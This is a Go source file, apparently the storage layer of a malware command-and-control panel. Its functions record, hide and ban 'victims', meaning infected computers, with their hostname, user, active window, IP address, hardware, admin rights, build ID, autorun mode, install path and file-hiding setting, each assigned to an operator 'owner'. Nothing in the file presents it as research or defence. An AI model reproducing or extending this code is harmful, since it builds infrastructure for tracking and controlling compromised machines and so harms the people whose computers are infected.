package storage

import (
	"context"
	"database/sql"
	"errors"
	"strings"
	"time"
)

func (d *DB) LoadHiddenVictims() (map[string]map[string]bool, error) {
	if d == nil || d.SQL() == nil {
		return nil, errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	rows, err := d.SQL().QueryContext(ctx, `SELECT COALESCE(owner, ''), COALESCE(victim_id, '') FROM hidden_victims`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	out := make(map[string]map[string]bool)
	for rows.Next() {
		var owner string
		var id string
		if err := rows.Scan(&owner, &id); err != nil {
			return nil, err
		}
		owner = strings.ToLower(strings.TrimSpace(owner))
		id = strings.TrimSpace(id)
		if owner == "" || id == "" {
			continue
		}
		m, ok := out[owner]
		if !ok {
			m = make(map[string]bool)
			out[owner] = m
		}
		m[id] = true
	}
	if err := rows.Err(); err != nil {
		return nil, err
	}
	return out, nil
}

func (d *DB) LoadVictimsFromDB() ([]*Victim, error) {
	if d == nil || d.SQL() == nil {
		return nil, errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	rows, err := d.SQL().QueryContext(ctx, `SELECT `+victimColumns+` FROM victims`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []*Victim
	for rows.Next() {
		v, err := scanVictimRow(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, v)
	}

	if err := rows.Err(); err != nil {
		return nil, err
	}
	return out, nil
}

func (d *DB) UpsertVictim(v *Victim) error {
	if d == nil || d.SQL() == nil {
		return errors.New("db is nil")
	}
	if v == nil || strings.TrimSpace(v.ID) == "" {
		return errors.New("victim is nil or id is empty")
	}

	v.Owner = strings.ToLower(strings.TrimSpace(v.Owner))

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	var lastActive int64
	if !v.LastActive.IsZero() {
		lastActive = v.LastActive.Unix()
	}

	_, err := d.SQL().ExecContext(ctx, `
		INSERT INTO victims (
			id,
			country,
			device_type,
			hostname,
			"user",
			"window",
			ip,
			comment,
			build_id,
			os,
			cpu,
			gpu,
			ram,
			last_active,
			online,
			owner,
			admin,
			build_version,
			startup_delay_sec,
			autorun_mode,
			install_path,
			hide_files_enabled
		) VALUES (
			$1, $2, $3, $4, $5, $6, $7, $8, $9, $10,
			$11, $12, $13, $14, $15, $16, $17, $18,
			$19, $20, $21, $22
		)
		ON CONFLICT (id) DO UPDATE SET
			country = EXCLUDED.country,
			device_type = EXCLUDED.device_type,
			hostname = EXCLUDED.hostname,
			"user" = EXCLUDED."user",
			"window" = EXCLUDED."window",
			ip = EXCLUDED.ip,
			comment = EXCLUDED.comment,
			build_id = EXCLUDED.build_id,
			os = EXCLUDED.os,
			cpu = EXCLUDED.cpu,
			gpu = EXCLUDED.gpu,
			ram = EXCLUDED.ram,
			last_active = EXCLUDED.last_active,
			online = EXCLUDED.online,
			owner = EXCLUDED.owner,
			admin = EXCLUDED.admin,
			build_version = EXCLUDED.build_version,
			startup_delay_sec = EXCLUDED.startup_delay_sec,
			autorun_mode = EXCLUDED.autorun_mode,
			install_path = EXCLUDED.install_path,
			hide_files_enabled = EXCLUDED.hide_files_enabled
	`,
		strings.TrimSpace(v.ID),
		v.Country,
		v.DeviceType,
		v.Hostname,
		v.User,
		v.Window,
		v.IP,
		v.Comment,
		v.BuildID,
		v.OS,
		v.CPU,
		v.GPU,
		v.RAM,
		lastActive,
		v.Online,
		v.Owner,
		v.Admin,
		v.BuildVersion,
		v.StartupDelaySeconds,
		v.AutorunMode,
		v.InstallPath,
		v.HideFilesEnabled,
	)
	return err
}

func (d *DB) IsVictimBanned(id string) (bool, error) {
	id = strings.TrimSpace(id)
	if id == "" {
		return false, nil
	}
	if d == nil || d.SQL() == nil {
		return false, errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	var exists bool
	err := d.SQL().QueryRowContext(ctx, `SELECT EXISTS (SELECT 1 FROM banned_victims WHERE id = $1)`, id).Scan(&exists)
	return exists, err
}

func (d *DB) LoadBannedVictimIDs() ([]string, error) {
	if d == nil || d.SQL() == nil {
		return nil, errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	rows, err := d.SQL().QueryContext(ctx, `SELECT id FROM banned_victims`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []string
	for rows.Next() {
		var id string
		if err := rows.Scan(&id); err != nil {
			return nil, err
		}
		id = strings.TrimSpace(id)
		if id != "" {
			out = append(out, id)
		}
	}
	if err := rows.Err(); err != nil {
		return nil, err
	}
	return out, nil
}

func (d *DB) BanVictimID(id string) error {
	id = strings.TrimSpace(id)
	if id == "" {
		return errors.New("id is empty")
	}
	if d == nil || d.SQL() == nil {
		return errors.New("db is nil")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := d.SQL().ExecContext(ctx, `
		INSERT INTO banned_victims (id)
		VALUES ($1)
		ON CONFLICT (id) DO NOTHING
	`, id)
	return err
}


